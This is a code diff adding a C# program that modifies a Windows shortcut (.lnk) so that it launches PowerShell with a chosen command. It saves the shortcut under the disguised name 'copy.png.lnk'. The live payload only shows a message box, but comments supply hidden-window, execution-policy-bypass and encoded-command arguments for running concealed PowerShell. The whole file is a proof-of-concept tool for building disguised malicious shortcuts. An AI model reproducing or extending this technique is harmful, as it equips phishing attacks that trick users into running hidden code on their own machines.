@@ -1,0 +1,50 @@
+using System;
+using System.IO;
+using Shell32;
+
+namespace Please
+{
+    internal class Program
+    {
+        [STAThread]
+        static void Main(string[] args)
+        {
+            //add a reference to Shell32.dll from the Windows\System32 folder and use it:
+            Shell shell = new Shell();
+
+            string exeloc = System.Reflection.Assembly.GetExecutingAssembly().Location;
+            string currentdir = System.IO.Path.GetDirectoryName(exeloc);
+            //creating example directory
+            Directory.CreateDirectory(Path.Combine(currentdir, "savepath"));
+
+            //you need to create a shortcut and set it up properly first, after that you can use it to create a new shortcut
+            //with a modified payload. (link.Arguments)
+            string filepath = Path.Combine(currentdir, @"savepath\test.lnk");
+            
+            string pathOnly = Path.GetDirectoryName(filepath);
+            string filenameOnly = Path.GetFileName(filepath);
+            Folder folder = shell.NameSpace(pathOnly);
+            FolderItem folderItem = folder.ParseName(filenameOnly);
+            if (folderItem != null)
+            {
+                Shell32.ShellLinkObject link = (Shell32.ShellLinkObject)folderItem.GetLink;
+
+                link.Arguments = "-command  Add-Type -AssemblyName PresentationCore,PresentationFramework;[System.Windows.MessageBox]::Show('Hello')";
+
+                //interesting stuff to check out includes
+                //link.Arguments = "-window hidden -ExecutionPolicy Bypass  -eNco " + encodedcommand;
+                //link.Arguments = "-window hidden -eNco " + encodedcommand;
+
+                //save the new copied shortcut with payload
+                link.Save(filepath + "copy.png.lnk");
+            }
+            else
+            {
+                throw new Exception("Something is wrong with the filepath of the shortcut");
+            }
+        }
+       
+
+
+}
+}
